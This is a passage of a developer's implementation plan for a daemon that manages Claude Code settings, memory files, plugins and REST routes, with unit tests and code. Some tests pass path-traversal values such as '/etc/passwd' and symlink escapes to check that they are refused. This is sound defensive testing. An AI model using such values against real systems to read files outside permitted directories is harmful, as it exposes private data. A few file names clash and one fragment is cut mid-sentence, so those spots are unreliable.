  const r = await run([...cmd, "auto-mode", ...args], { timeoutMs: 30_000 });
  if (r.code !== 0) throw new Error(`claude auto-mode ${args.join(" ")} failed: ${r.out.slice(-800)}`);
  return r.out;
}

/** The effective config: the user's settings merged over CC's built-ins. */
export async function readAutoModeConfig(
  run: CommandRunner = defaultRun,
  env: Record<string, string | undefined> = process.env,
): Promise<AutoModeConfig> {
  return parseAutoModeConfig(await ccAutoMode(["config"], run, env));
}

/** CC's built-in rules — what `$defaults` splices in. Needed to render `splicedPreview`. */
export async function readAutoModeDefaults(
  run: CommandRunner = defaultRun,
  env: Record<string, string | undefined> = process.env,
): Promise<AutoModeConfig> {
  return parseAutoModeConfig(await ccAutoMode(["defaults"], run, env));
}
```

**Step 4: Run test, verify pass**

Run: `bun test test/unit/cc-automode.test.ts`
Expected: PASS, 6 tests

**Step 5: Commit**

`git commit -m "feat(cc-config): auto-mode config reader + \$defaults splice preview"`

---

## Task 10: Auto-mode write + critique + reset

**Files:**
- Modify: `anvild/src/cc/automode.ts`
- Modify: `anvild/test/unit/cc-automode.test.ts`

**Step 1: Write failing test** (append)

```ts
import { mkdtempSync, readFileSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { writeAutoModeBlock } from "../../src/cc/automode";

function fakeHome(): string {
  const home = mkdtempSync(join(tmpdir(), "cc-automode-home-"));
  mkdirSync(join(home, ".claude"), { recursive: true });
  return home;
}

test("writeAutoModeBlock writes ONLY the autoMode key and preserves the rest of settings.json", () => {
  const home = fakeHome();
  const settings = join(home, ".claude", "settings.json");
  writeFileSync(settings, JSON.stringify({ autoMemoryEnabled: true, permissions: { ask: ["Bash(git push *)"] } }, null, 2));

  writeAutoModeBlock({ allow: ["$defaults", "mine"], soft_deny: [], hard_deny: [], environment: ["$defaults"] }, home);

  const after = JSON.parse(readFileSync(settings, "utf8"));
  expect(after.autoMode.allow).toEqual(["$defaults", "mine"]);
  expect(after.autoMemoryEnabled).toBe(true);            // untouched
  expect(after.permissions.ask).toEqual(["Bash(git push *)"]); // untouched
});

test("writeAutoModeBlock creates settings.json when absent", () => {
  const home = fakeHome();
  writeAutoModeBlock({ allow: [], soft_deny: [], hard_deny: [], environment: [] }, home);
  const after = JSON.parse(readFileSync(join(home, ".claude", "settings.json"), "utf8"));
  expect(after.autoMode).toBeDefined();
});

test("writeAutoModeBlock drops empty sections rather than writing [] — [] discards CC's defaults", () => {
  const home = fakeHome();
  writeAutoModeBlock({ allow: ["$defaults"], soft_deny: [], hard_deny: [], environment: [] }, home);
  const after = JSON.parse(readFileSync(join(home, ".claude", "settings.json"), "utf8"));
  expect(after.autoMode.allow).toEqual(["$defaults"]);
  expect("soft_deny" in after.autoMode).toBe(false);
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/unit/cc-automode.test.ts`
Expected: FAIL — `writeAutoModeBlock` is not exported

**Step 3: Implement** (append to `src/cc/automode.ts`)

```ts
import { readFileSync, writeFileSync, mkdirSync } from "node:fs";
import { join } from "node:path";
import { homedir } from "node:os";

/**
 * Write the `autoMode` block into the USER settings file, merging over whatever else is there.
 *
 * [SEC] Always `~/.claude/settings.json` — never a project settings file. CC deliberately excludes
 * `.claude/settings.json` and `.claude/settings.local.json` from autoMode resolution so a checked-in
 * repo cannot inject its own allow rules; writing there would reopen the hole CC closed
 * (design §9).
 *
 * Empty sections are OMITTED rather than written as `[]`, because `[]` is not "no opinion" — it
 * discards CC's entire built-in list for that section.
 */
export function writeAutoModeBlock(cfg: AutoModeConfig, home: string = homedir()): void {
  const dir = join(home, ".claude");
  const path = join(dir, "settings.json");
  mkdirSync(dir, { recursive: true });

  let current: Record<string, unknown> = {};
  try {
    current = JSON.parse(readFileSync(path, "utf8")) as Record<string, unknown>;
  } catch {
    /* absent or unparseable — treat as empty and rewrite (CC would ignore an unparseable file too) */
  }

  const block: Record<string, string[]> = {};
  for (const s of AUTOMODE_SECTIONS) if (cfg[s].length) block[s] = cfg[s];

  writeFileSync(path, `${JSON.stringify({ ...current, autoMode: block }, null, 2)}\n`, { mode: 0o600 });
}

/** `claude auto-mode critique` — AI feedback on custom rules. Returns the CLI's prose verbatim. */
export async function critiqueAutoMode(
  run: CommandRunner = defaultRun,
  env: Record<string, string | undefined> = process.env,
): Promise<string> {
  return ccAutoMode(["critique"], run, env);
}

/** `claude auto-mode reset --yes` — removes the autoMode section from user settings. */
export async function resetAutoMode(
  run: CommandRunner = defaultRun,
  env: Record<string, string | undefined> = process.env,
): Promise<void> {
  await ccAutoMode(["reset", "--yes"], run, env);
}
```

**Step 4: Run test, verify pass**

Run: `bun test test/unit/cc-automode.test.ts`
Expected: PASS, 9 tests

**Step 5: Commit**

`git commit -m "feat(cc-config): auto-mode block writer (user settings only), critique, reset"`

---

## Task 11: `src/cc/memory.ts` list/read + path confinement + budget

**Files:**
- Create: `anvild/src/cc/memory.ts`
- Create: `anvild/test/unit/cc-memory.test.ts`

**Step 1: Write failing test**

`anvild/test/unit/cc-memory.test.ts`:

```ts
/**
 * The memory adapter (cc-config design §6.4). Memory lives wherever CC says it lives — the directory
 * comes from `init.memory_paths.auto`, never derived here (principle 1; deriving the project slug
 * would reimplement CC logic and break silently when CC changes it).
 *
 * Two invariants are security-relevant: every file access is confined to the memory dir (no
 * traversal, no symlink escape), and MEMORY.md's 200-line / 25KB budget is reported, because CC
 * accepts an over-budget write and then drops the overflow on the next load — a silent save is data
 * loss in effect.
 */
import { test, expect } from "bun:test";
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { listMemory, readMemoryFile, memoryBudget, MEMORY_LINE_LIMIT, MEMORY_BYTE_LIMIT } from "../../src/cc/memory";

function memDir(): string {
  const d = mkdtempSync(join(tmpdir(), "cc-memory-"));
  const m = join(d, "memory");
  mkdirSync(m, { recursive: true });
  return m;
}

test("lists MEMORY.md first, then topic files, with sizes", () => {
  const m = memDir();
  writeFileSync(join(m, "debugging.md"), "# debug\n");
  writeFileSync(join(m, "MEMORY.md"), "- [a](a.md)\n");
  writeFileSync(join(m, "api.md"), "# api\n");
  const out = listMemory(m);
  expect(out[0]!.name).toBe("MEMORY.md"); // the index is the only file loaded every session
  expect(out.map((f) => f.name)).toEqual(["MEMORY.md", "api.md", "debugging.md"]);
  expect(out[0]!.bytes).toBeGreaterThan(0);
});

test("a missing memory dir lists empty rather than throwing", () => {
  expect(listMemory(join(tmpdir(), "definitely-not-here-xyz"))).toEqual([]);
});

test("non-markdown files are ignored", () => {
  const m = memDir();
  writeFileSync(join(m, "MEMORY.md"), "x\n");
  writeFileSync(join(m, "notes.txt"), "x\n");
  expect(listMemory(m).map((f) => f.name)).toEqual(["MEMORY.md"]);
});

test("readMemoryFile returns contents", () => {
  const m = memDir();
  writeFileSync(join(m, "MEMORY.md"), "hello\n");
  expect(readMemoryFile(m, "MEMORY.md").text).toBe("hello\n");
});

test("path traversal is rejected", () => {
  const m = memDir();
  expect(() => readMemoryFile(m, "../outside.md")).toThrow(/outside the memory directory/);
  expect(() => readMemoryFile(m, "/etc/passwd")).toThrow(/outside the memory directory/);
  expect(() => readMemoryFile(m, "sub/../../escape.md")).toThrow(/outside the memory directory/);
});

test("a symlink escaping the memory dir is rejected", () => {
  const m = memDir();
  writeFileSync(join(m, "..", "secret.md"), "s\n");
  symlinkSync(join(m, "..", "secret.md"), join(m, "link.md"));
  expect(() => readMemoryFile(m, "link.md")).toThrow(/outside the memory directory/);
});

test("memoryBudget reports ok / near / over against the 200-line and 25KB limits", () => {
  expect(memoryBudget("a\n".repeat(10)).state).toBe("ok");
  expect(memoryBudget("a\n".repeat(MEMORY_LINE_LIMIT - 5)).state).toBe("near");
  expect(memoryBudget("a\n".repeat(MEMORY_LINE_LIMIT + 1)).state).toBe("over");
  expect(memoryBudget("x".repeat(MEMORY_BYTE_LIMIT + 1)).state).toBe("over");
});

test("frontmatter and block HTML comments do not count toward the budget", () => {
  // CC strips both before loading, so counting them would warn on files that actually fit.
  const body = "a\n".repeat(20);
  const withFm = `---\nname: x\n---\n<!--\n${"c\n".repeat(500)}-->\n${body}`;
  expect(memoryBudget(withFm).lines).toBe(memoryBudget(body).lines);
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/unit/cc-memory.test.ts`
Expected: FAIL with `Cannot find module '../../src/cc/memory'`

**Step 3: Implement**

`anvild/src/cc/memory.ts`:

```ts
/**
 * Auto-memory browsing (cc-config design §6.4). CC keys memory by git repository — all worktrees and
 * subdirectories of a repo share one directory — and reports the resolved path on every turn as
 * `init.memory_paths.auto`. Anvil READS that path and never derives it (principle 1).
 *
 * `MEMORY.md` is the index and the only file loaded at session start (first 200 lines or 25KB,
 * whichever comes first). Topic files are read on demand by the agent. CC accepts a write that blows
 * the budget and then drops the overflow on the next load, so `memoryBudget` exists to warn BEFORE
 * saving — an over-budget save is silent data loss.
 */
import { existsSync, readdirSync, readFileSync, statSync, realpathSync } from "node:fs";
import { join, resolve } from "node:path";

export const MEMORY_INDEX = "MEMORY.md";
export const MEMORY_LINE_LIMIT = 200;
export const MEMORY_BYTE_LIMIT = 25 * 1024;
/** Warn when within this fraction of a limit. */
const NEAR = 0.9;

export interface MemoryFile {
  name: string;
  bytes: number;
  modified: string; // ISO
}

export interface MemoryBudget {
  lines: number;
  bytes: number;
  state: "ok" | "near" | "over";
}

/**
 * Resolve `name` inside `dir`, refusing anything that escapes it. Mirrors the worktree-escape check
 * in agent/pipeline-guard.ts: compare against `dir + "/"` so a sibling sharing the prefix cannot slip
 * through, and resolve symlinks so a link out of the directory is caught too.
 */
export function resolveInside(dir: string, name: string): string {
  const root = realpathSync(resolve(dir));
  const abs = resolve(root, name);
  const real = existsSync(abs) ? realpathSync(abs) : abs;
  if (real !== root && !real.startsWith(`${root}/`)) {
    throw new Error(`refusing ${name}: outside the memory directory`);
  }
  return real;
}

/** List markdown files, MEMORY.md first then the rest alphabetically. Missing dir ⇒ empty. */
export function listMemory(dir: string): MemoryFile[] {
  if (!existsSync(dir)) return [];
  const files = readdirSync(dir)
    .filter((n) => n.endsWith(".md"))
    .map((name) => {
      const st = statSync(join(dir, name));
      return { name, bytes: st.size, modified: st.mtime.toISOString() };
    });
  return files.sort((a, b) =>
    a.name === MEMORY_INDEX ? -1 : b.name === MEMORY_INDEX ? 1 : a.name.localeCompare(b.name),
  );
}

export function readMemoryFile(dir: string, name: string): { text: string; modified: string } {
  const abs = resolveInside(dir, name);
  const st = statSync(abs);
  return { text: readFileSync(abs, "utf8"), modified: st.mtime.toISOString() };
}

/**
 * Measure what CC will actually load. YAML frontmatter and block-level HTML comments are stripped
 * before the index is loaded, so they must not count — counting them would warn on files that fit.
 */
export function memoryBudget(text: string): MemoryBudget {
  const noFm = text.replace(/^---\n[\s\S]*?\n---\n/, "");
  const noComments = noFm.replace(/<!--[\s\S]*?-->/g, "");
  const lines = noComments.split("\n").filter((l, i, a) => i < a.length - 1 || l.length > 0).length;
  const bytes = Buffer.byteLength(noComments, "utf8");
  const over = lines > MEMORY_LINE_LIMIT || bytes > MEMORY_BYTE_LIMIT;
  const near = lines >= MEMORY_LINE_LIMIT * NEAR || bytes >= MEMORY_BYTE_LIMIT * NEAR;
  return { lines, bytes, state: over ? "over" : near ? "near" : "ok" };
}
```

**Step 4: Run test, verify pass**

Run: `bun test test/unit/cc-memory.test.ts`
Expected: PASS, 8 tests

**Step 5: Commit**

`git commit -m "feat(cc-config): memory listing, confined reads, MEMORY.md budget"`

---

## Task 12: Memory write/delete + stale-write rejection

**Files:**
- Modify: `anvild/src/cc/memory.ts`
- Modify: `anvild/test/unit/cc-memory.test.ts`

**Step 1: Write failing test** (append)

```ts
import { rmSync } from "node:fs";
import { writeMemoryFile, deleteMemoryFile } from "../../src/cc/memory";

test("writes a file and returns the new mtime", () => {
  const m = memDir();
  const r = writeMemoryFile(m, "notes.md", "hello\n");
  expect(readMemoryFile(m, "notes.md").text).toBe("hello\n");
  expect(typeof r.modified).toBe("string");
});

test("a write whose expectedModified is stale is REJECTED (Claude writes memory mid-session)", () => {
  const m = memDir();
  writeMemoryFile(m, "notes.md", "v1\n");
  const stale = "1999-01-01T00:00:00.000Z";
  expect(() => writeMemoryFile(m, "notes.md", "v2\n", stale)).toThrow(/changed on disk/);
  expect(readMemoryFile(m, "notes.md").text).toBe("v1\n"); // unchanged
});

test("a write with the CURRENT mtime succeeds", () => {
  const m = memDir();
  writeMemoryFile(m, "notes.md", "v1\n");
  const cur = readMemoryFile(m, "notes.md").modified;
  writeMemoryFile(m, "notes.md", "v2\n", cur);
  expect(readMemoryFile(m, "notes.md").text).toBe("v2\n");
});

test("creating a NEW file requires no expectedModified", () => {
  const m = memDir();
  writeMemoryFile(m, "fresh.md", "x\n", undefined);
  expect(readMemoryFile(m, "fresh.md").text).toBe("x\n");
});

test("writes and deletes are confined to the memory dir", () => {
  const m = memDir();
  expect(() => writeMemoryFile(m, "../escape.md", "x")).toThrow(/outside the memory directory/);
  expect(() => deleteMemoryFile(m, "../escape.md")).toThrow(/outside the memory directory/);
});

test("delete removes the file", () => {
  const m = memDir();
  writeMemoryFile(m, "gone.md", "x\n");
  deleteMemoryFile(m, "gone.md");
  expect(listMemory(m).map((f) => f.name)).not.toContain("gone.md");
});

test("only .md files may be written", () => {
  const m = memDir();
  expect(() => writeMemoryFile(m, "evil.sh", "#!/bin/sh")).toThrow(/only \.md/);
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/unit/cc-memory.test.ts`
Expected: FAIL — `writeMemoryFile` is not exported

**Step 3: Implement** (append to `src/cc/memory.ts`)

```ts
import { writeFileSync, unlinkSync } from "node:fs";

/**
 * Write a memory file.
 *
 * `expectedModified` is the mtime the caller last read. If the file changed since, the write is
 * REJECTED — Claude writes to this directory during a live session, and a UI edit must not clobber a
 * concurrent agent write. Omit it only when creating a new file.
 */
export function writeMemoryFile(
  dir: string,
  name: string,
  text: string,
  expectedModified?: string,
): { modified: string } {
  if (!name.endsWith(".md")) throw new Error(`refusing ${name}: only .md files live in memory`);
  const abs = resolveInside(dir, name);
  if (existsSync(abs) && expectedModified) {
    const cur = statSync(abs).mtime.toISOString();
    if (cur !== expectedModified) {
      throw new Error(`refusing write: ${name} changed on disk since it was read`);
    }
  }
  writeFileSync(abs, text, "utf8");
  return { modified: statSync(abs).mtime.toISOString() };
}

export function deleteMemoryFile(dir: string, name: string): void {
  const abs = resolveInside(dir, name);
  unlinkSync(abs);
}
```

**Step 4: Run test, verify pass**

Run: `bun test test/unit/cc-memory.test.ts`
Expected: PASS, 15 tests

**Step 5: Commit**

`git commit -m "feat(cc-config): memory writes with stale-write rejection + delete"`

---

## Task 13: Memory settings

**Files:**
- Modify: `anvild/src/cc/memory.ts`
- Modify: `anvild/test/unit/cc-memory.test.ts`

**Step 1: Write failing test** (append)

```ts
import { readMemorySettings, writeMemorySettings } from "../../src/cc/memory";

function home(): string {
  const h = mkdtempSync(join(tmpdir(), "cc-mem-home-"));
  mkdirSync(join(h, ".claude"), { recursive: true });
  return h;
}

test("defaults: auto memory enabled, no custom directory", () => {
  expect(readMemorySettings(home())).toEqual({ autoMemoryEnabled: true, autoMemoryDirectory: undefined });
});

test("reads both keys", () => {
  const h = home();
  writeFileSync(join(h, ".claude", "settings.json"), JSON.stringify({ autoMemoryEnabled: false, autoMemoryDirectory: "~/mem" }));
  expect(readMemorySettings(h)).toEqual({ autoMemoryEnabled: false, autoMemoryDirectory: "~/mem" });
});

test("writing the toggle preserves other settings", () => {
  const h = home();
  writeFileSync(join(h, ".claude", "settings.json"), JSON.stringify({ autoMode: { allow: ["$defaults"] } }));
  writeMemorySettings({ autoMemoryEnabled: false }, h);
  const after = JSON.parse(readFileSync(join(h, ".claude", "settings.json"), "utf8"));
  expect(after.autoMemoryEnabled).toBe(false);
  expect(after.autoMode.allow).toEqual(["$defaults"]); // untouched
});

test("autoMemoryDirectory must be absolute or ~/-prefixed, as CC requires", () => {
  const h = home();
  expect(() => writeMemorySettings({ autoMemoryDirectory: "relative/path" }, h)).toThrow(/absolute or start with/);
  writeMemorySettings({ autoMemoryDirectory: "~/mem" }, h);
  writeMemorySettings({ autoMemoryDirectory: "/srv/mem" }, h);
});

test("clearing autoMemoryDirectory removes the key rather than writing empty string", () => {
  const h = home();
  writeMemorySettings({ autoMemoryDirectory: "~/mem" }, h);
  writeMemorySettings({ autoMemoryDirectory: null }, h);
  const after = JSON.parse(readFileSync(join(h, ".claude", "settings.json"), "utf8"));
  expect("autoMemoryDirectory" in after).toBe(false);
});
```

**Step 2: Run test, verify failure**

Run: `bun test test/unit/cc-memory.test.ts`
Expected: FAIL — `readMemorySettings` is not exported

**Step 3: Implement** (append to `src/cc/memory.ts`)

```ts
import { mkdirSync } from "node:fs";
import { homedir } from "node:os";

export interface MemorySettings {
  autoMemoryEnabled: boolean;
  /** Where CC stores auto memory. Anvil SURFACES this and never sets it on its own (design §6.4,
   *  principle 2): relocating memory into a repo creates an untracked directory the user must then
   *  commit or ignore, which is Anvil making a repo decision by side effect. */
  autoMemoryDirectory?: string;
}

const settingsPath = (home: string): string => join(home, ".claude", "settings.json");

function readSettings(home: string): Record<string, unknown> {
  try {
    return JSON.parse(readFileSync(settingsPath(home), "utf8")) as Record<string, unknown>;
  } catch {
    return {};
  }
}

export function readMemorySettings(home: string = homedir()): MemorySettings {
  const s = readSettings(home);
  return {
    autoMemoryEnabled: s.autoMemoryEnabled !== false, // on by default
    autoMemoryDirectory: typeof s.autoMemoryDirectory === "string" ? s.autoMemoryDirectory : undefined,
  };
}

/** Patch memory settings, preserving everything else. `autoMemoryDirectory: null` clears the key. */
export function writeMemorySettings(
  patch: { autoMemoryEnabled?: boolean; autoMemoryDirectory?: string | null },
  home: string = homedir(),
): void {
  if (typeof patch.autoMemoryDirectory === "string") {
    const v = patch.autoMemoryDirectory;
    if (!v.startsWith("/") && !v.startsWith("~/")) {
      throw new Error("autoMemoryDirectory must be absolute or start with ~/");
    }
  }
  const next = { ...readSettings(home) };
  if (patch.autoMemoryEnabled !== undefined) next.autoMemoryEnabled = patch.autoMemoryEnabled;
  if (patch.autoMemoryDirectory === null) delete next.autoMemoryDirectory;
  else if (patch.autoMemoryDirectory !== undefined) next.autoMemoryDirectory = patch.autoMemoryDirectory;

  mkdirSync(join(home, ".claude"), { recursive: true });
  writeFileSync(settingsPath(home), `${JSON.stringify(next, null, 2)}\n`, { mode: 0o600 });
}
```

**Step 4: Run test, verify pass**

Run: `bun test test/unit/cc-memory.test.ts`
Expected: PASS, 20 tests

**Step 5: Commit**

`git commit -m "feat(cc-config): memory settings read/write (directory surfaced, never set)"`

---

## Task 14: `cc-config` capability + contract test

**Files:**
- Modify: `anvild/src/server/identity.ts:101` (append to the capability array)
- Modify: `anvild/test/contract/protocol-surface.test.ts`

**Step 1: Add the capability** — in `src/server/identity.ts`, after the `"cc-update"` entry:

```ts
  // One Anvil surface for the per-machine ~/.claude config: plugins, MCP servers, auto-mode config,
  // and memory (cc-config design). Clients gate the whole Settings → Claude Code area on this, so an
  // older daemon renders nothing rather than dead controls.
  "cc-config",
```

**Step 2: Pin it** — add to `test/contract/protocol-surface.test.ts`:

```ts
test("the cc-config capability is advertised", async () => {
  const { CAPABILITIES } = await import("../../src/server/identity");
  expect(CAPABILITIES).toContain("cc-config");
});
```

(If `CAPABILITIES` is not the exported name, use the existing export in `identity.ts`.)

**Step 3: Run**

Run: `bun test test/contract/`
Expected: PASS. If the surface golden pins the capability list, regenerate with `bun test/contract/regen-golden.ts` and review the diff — it must show only an addition.

**Step 4: Commit** — `git commit -m "feat(cc-config): advertise the cc-config capability"`

---

## Task 15: `CcConfigService` + Deps guard test

**Files:**
- Create: `anvild/src/session/ccconfig-service.ts`
- Create: `anvild/test/unit/plugin-service.test.ts`

**Step 1: Write failing test**

```ts
/**
 * [P7] CcConfigService — the plugin/MCP domain. This isolates the INJECTION CONTRACT: every CLI call
 * goes through the injected adapter (so tests never touch a real ~/.claude), operations on one
 * server are serialised, and a failing op reports rather than throwing past the caller.
 */
import { test, expect } from "bun:test";
import { CcConfigService, type CcConfigServiceDeps } from "../../src/session/plugin-service";
import type { PluginInfo } from "../../src/cc/plugins";

function harness(overrides: Partial<CcConfigServiceDeps> = {}) {
  const calls: string[] = [];
  const plugins: PluginInfo[] = [
    { id: "a@m", name: "a", marketplace: "m", version: "1.0.0", enabled: true, scope: "user", mcpServers: [] },
  ];
  const deps: CcConfigServiceDeps = {
    listPlugins: async () => (calls.push("list"), plugins),
    listAvailable: async () => [],
    pluginOp: async (op, id) => (calls.push(`${op}:${id}`), "ok"),
    listMarketplaces: async () => [],
    marketplaceOp: async () => "ok",
    listMcp: async () => [],
    addMcp: async () => "ok",
    removeMcp: async () => "ok",
    ...overrides,
  };
  return { svc: new CcConfigService(deps), calls };
}

test("list delegates to the adapter", async () => {
  const { svc, calls } = harness();
  expect((await svc.list()).length).toBe(1);
  expect(calls).toEqual(["list"]);
});

test("a second operation is refused while one is in flight (re-entrancy guard)", async () => {
  let release!: () => void;
  const gate = new Promise<void>((r) => (release = r));
  const { svc } = harness({ pluginOp: async () => (await gate, "ok") });
  const first = svc.op("install", "a@m");
  await expect(svc.op("install", "b@m")).rejects.toThrow(/already in progress/i);
  release();
  await first;
});

test("the guard clears after a FAILED operation, so one error doesn't wedge the server", async () => {
  const { svc } = harness({ pluginOp: async () => { throw new Error("boom"); } });
  await expect(svc.op("install", "a@m")).rejects.toThrow(/boom/);
  await expect(svc.op("install", "a@m")).rejects.toThrow(/boom/); // not "already in progress"
});
```

**Step 2: Run, verify failure.**

**Step 3: Implement** `anvild/src/session/ccconfig-service.ts`:

```ts
/**
 * Plugin + MCP management domain (design §4.1), following the P7 injected-deps pattern: every
 * outside effect arrives through `CcConfigServiceDeps`, so the supervisor stays thin and tests never
 * shell out to a real `claude` or touch a real `~/.claude`.
 */
import type { PluginInfo, PluginOp, MarketplaceOp } from "../cc/plugins";
import type { McpServerInfo } from "../cc/mcp";
import { BadCommand } from "./errors";

export interface CcConfigServiceDeps {
  listPlugins: () => Promise<PluginInfo[]>;
  listAvailable: () => Promise<PluginInfo[]>;
  pluginOp: (op: PluginOp, id: string, scope?: string) => Promise<string>;
  listMarketplaces: () => Promise<unknown>;
  marketplaceOp: (op: MarketplaceOp, source: string) => Promise<string>;
  listMcp: () => Promise<McpServerInfo[]>;
  addMcp: (name: string, config: Record<string, unknown>) => Promise<string>;
  removeMcp: (name: string) => Promise<string>;
}

export class CcConfigService {
  constructor(private readonly deps: CcConfigServiceDeps) {}

  /** One mutation at a time per daemon: the CLI writes shared state under ~/.claude, and two
   *  concurrent installs would interleave. (The autopilot re-entrancy bug is the same shape.) */
  private busy = false;

  private async exclusive<T>(fn: () => Promise<T>): Promise<T> {
    if (this.busy) throw new BadCommand("a plugin operation is already in progress on this server");
    this.busy = true;
    try {
      return await fn();
    } finally {
      this.busy = false; // cleared on failure too, so one error can't wedge the server
    }
  }

  list(): Promise<PluginInfo[]> {
    return this.deps.listPlugins();
  }
  available(): Promise<PluginInfo[]> {
    return this.deps.listAvailable();
  }
  marketplaces(): Promise<unknown> {
    return this.deps.listMarketplaces();
  }
  mcp(): Promise<McpServerInfo[]> {
    return this.deps.listMcp();
  }

  op(op: PluginOp, id: string, scope?: string): Promise<string> {
    return this.exclusive(() => this.deps.pluginOp(op, id, scope));
  }
  marketplace(op: MarketplaceOp, source: string): Promise<string> {
    return this.exclusive(() => this.deps.marketplaceOp(op, source));
  }
  addMcp(name: string, config: Record<string, unknown>): Promise<string> {
    return this.exclusive(() => this.deps.addMcp(name, config));
  }
  removeMcp(name: string): Promise<string> {
    return this.exclusive(() => this.deps.removeMcp(name));
  }
}
```

**Step 4: Run, verify pass.** Expected: PASS (3 tests).

**Step 5: Commit** — `git commit -m "feat(cc-config): CcConfigService domain with per-server serialisation"`

**Additionally — new in this plan:**

Extend `CcConfigServiceDeps` with the two
new domains:

```ts
export interface CcConfigServiceDeps {
  /* …plugin + mcp deps from the superseded plan… */

  /** The CC binary vector + env, so every adapter call inherits account selection. */
  ccEnv: () => Record<string, string | undefined>;
  /** The memory directory CC reported on the last turn (`init.memory_paths.auto`). Undefined until a
   *  turn has run — the UI shows "run a turn to locate memory" rather than guessing a path. */
  memoryDir: () => string | undefined;
}
```

`memoryDir` is the seam that keeps principle 1: the service never derives a project slug.

`git commit -m "feat(cc-config): CcConfigService domain service + deps guard"`

---

## Task 16: Wire the service into the server

**Files:** Modify `anvild/src/server/http.ts` (near the `ccUpdater` construction, ~line 258)

**Step 1: Construct it** — after the `ccUpdater` block:

```ts
  // Plugin + MCP management (design §4.1). Real adapter by default; tests inject `opts.pluginService`.
  const pluginService =
    opts.pluginService ??
    new CcConfigService({
      listPlugins: () => listPlugins(),
      listAvailable: () => listAvailablePlugins(),
      pluginOp: (op, id, scope) => pluginOp(op, id, scope ? { scope } : {}),
      listMarketplaces: () => listMarketplaces(),
      marketplaceOp: (op, source) => marketplaceOp(op, source),
      listMcp: () => listMcpServers(),
      addMcp: (name, config) => addMcpServer(name, config),
      removeMcp: (name) => removeMcpServer(name),
    });
```

Add to the imports at the top of `http.ts`:

```ts
import { CcConfigService } from "../session/plugin-service";
import { listPlugins, listAvailablePlugins, pluginOp, listMarketplaces, marketplaceOp } from "../cc/plugins";
import { listMcpServers, addMcpServer, removeMcpServer } from "../cc/mcp";
```

And add `pluginService?: CcConfigService;` to the server options interface (next to `ccUpdater?: CcUpdater;`, ~line 193).

**Step 2: Verify**

Run: `bun run typecheck`
Expected: clean.

**Step 3: Commit** — `git commit -m "feat(cc-config): construct CcConfigService in the server"`

**Additionally — new in this plan:**

Additionally: capture `memory_paths.auto` from the `init` line. In `src/cc/turn-runner.ts`, where
`init` is already parsed, store `memory_paths?.auto` on the session and expose it through the
supervisor so `memoryDir()` can read it. Add a unit test asserting a parsed `init` with
`memory_paths` populates it.

`git commit -m "feat(cc-config): wire service + capture memory_paths.auto from init"`

---

## Task 17: REST read routes

**Files:** Modify `anvild/src/server/http.ts` (after the `/api/cc/v1/rollback` route); create `anvild/test/integration/plugin-routes.test.ts`

**Step 1: Write failing test**

```ts
/**
 * The plugin REST surface. Reads are unauthenticated-but-tailnet-gated like the rest of /api/cc/v1;
 * writes require JSON content-type and reject a different tailnet user (parity with /apply).
 */
import { test, expect } from "bun:test";
import { bootServer } from "../helpers";
import { CcConfigService } from "../../src/session/plugin-service";

const fakeService = () =>
  new CcConfigService({
    listPlugins: async () => [{ id: "a@m", name: "a", marketplace: "m", version: "1", enabled: true, scope: "user", mcpServers: [] }],
    listAvailable: async () => [],
    pluginOp: async () => "installed",
    listMarketplaces: async () => [{ name: "m" }],
    marketplaceOp: async () => "ok",
    listMcp: async () => [{ name: "srv", connected: true }],
    addMcp: async () => "ok",
    removeMcp: async () => "ok",
  });

test("GET /api/cc/v1/plugins returns the installed list", async () => {
  const srv = await bootServer({ pluginService: fakeService() });
  try {
    const res = await fetch(`${srv.base}/api/cc/v1/plugins`);
    expect(res.status).toBe(200);
    const body = (await res.json()) as { plugins: { id: string }[] };
    expect(body.plugins[0]!.id).toBe("a@m");
  } finally {
    srv.cleanup();
  }
});

test("GET /api/cc/v1/mcp returns servers with status", async () => {
  const srv = await bootServer({ pluginService: fakeService() });
  try {
    const body = (await (await fetch(`${srv.base}/api/cc/v1/mcp`)).json()) as { servers: { name: string }[] };
    expect(body.servers[0]!.name).toBe("srv");
  } finally {
    srv.cleanup();
  }
});
```

`bootServer` must forward the new option — extend `test/helpers/index.ts` `bootServer(opts)` to accept and pass `pluginService`.

**Step 2: Run, verify failure** (404s).

**Step 3: Implement** — in `http.ts`:

```ts
  // ── Plugin + MCP management (design §5) ────────────────────────────────────────────────────
  const pluginErr = (e: unknown): Response =>
    Response.json({ error: e instanceof Error ? e.message : String(e) }, { status: 500 });

  route("GET", "/api/cc/v1/plugins", async () => {
    try {
      return Response.json({ plugins: await pluginService.list() });
    } catch (e) {
      return pluginErr(e);
    }
  });
  route("GET", "/api/cc/v1/plugins/available", async () => {
    try {
      return Response.json({ plugins: await pluginService.available() });
    } catch (e) {
      return pluginErr(e);
    }
  });
  route("GET", "/api/cc/v1/marketplaces", async () => {
    try {
      return Response.json({ marketplaces: await pluginService.marketplaces() });
    } catch (e) {
      return pluginErr(e);
    }
  });
  route("GET", "/api/cc/v1/mcp", async () => {
    try {
      return Response.json({ servers: await pluginService.mcp() });
    } catch (e) {
      return pluginErr(e);
    }
  });
```

**Step 4: Run, verify pass.**

**Step 5: Commit** — `git commit -m "feat(cc-config): REST read routes"`

**Additionally — new in this plan:**

ts` — do not add an `if` ladder. Use
`routeRe` for the per-file path with an encoded filename segment.

`git commit -m "feat(cc-config): REST read routes for all four domains"`

---

## Task 18: REST write routes + job progress

**Files:** Modify `anvild/src/server/http.ts`, `anvild/test/integration/plugin-routes.test.ts`

**Step 1: Write failing test** — append:

```ts
test("POST /api/cc/v1/plugins/install requires JSON content-type", async () => {
  const srv = await bootServer({ pluginService: fakeService() });
  try {
    const res = await fetch(`${srv.base}/api/cc/v1/plugins/install`, { method: "POST", body: "id=a" });
    expect(res.status).toBe(415);
  } finally {
    srv.cleanup();
  }
});

test("POST install returns the CLI's output", async () => {
  const srv = await bootServer({ pluginService: fakeService() });
  try {
    const res = await fetch(`${srv.base}/api/cc/v1/plugins/install`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ id: "a@m" }),
    });
    expect(res.status).toBe(200);
    expect((await res.json()).output).toBe("installed");
  } finally {
    srv.cleanup();
  }
});

test("an unknown op is a 400, not a spawn", async () => {
  const srv = await bootServer({ pluginService: fakeService() });
  try {
